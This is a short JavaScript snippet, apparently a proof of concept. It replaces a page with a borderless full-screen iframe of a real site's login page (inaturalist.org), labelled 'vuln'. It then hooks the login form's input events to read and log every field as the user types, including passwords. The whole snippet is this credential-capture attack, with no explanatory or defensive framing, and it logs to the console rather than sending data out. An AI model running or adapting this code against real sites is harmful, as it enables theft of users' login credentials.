
const newHTML = `<iframe id='vuln' src="http://inaturalist.org/login" width="100%" height="100%" style="border:none;">
  <p>Your browser does not support iframes. <a href="https://www.example.com">Click here to visit the site directly.</a></p>
</iframe>`;
document.open("text/html");
document.write(newHTML);
document.close();

const myIframe = document.getElementById('vuln');

// 2. Wait for the iframe to fully load its DOM
myIframe.addEventListener('load', () => {
    
    const iframeWindow = myIframe.contentWindow;
    const iframeDoc = myIframe.contentDocument || iframeWindow.document;

    const targetForm = iframeDoc.getElementById('new_user');

    targetForm.addEventListener('input', (event) => {
        const changedElement = event.target; 
        
        const formData = new FormData(targetForm);
        const currentFormValues = Object.fromEntries(formData.entries());

        console.log(`User is typing in: ${changedElement.name}`);
        console.log('Current Form Contents:', currentFormValues);
    });
});
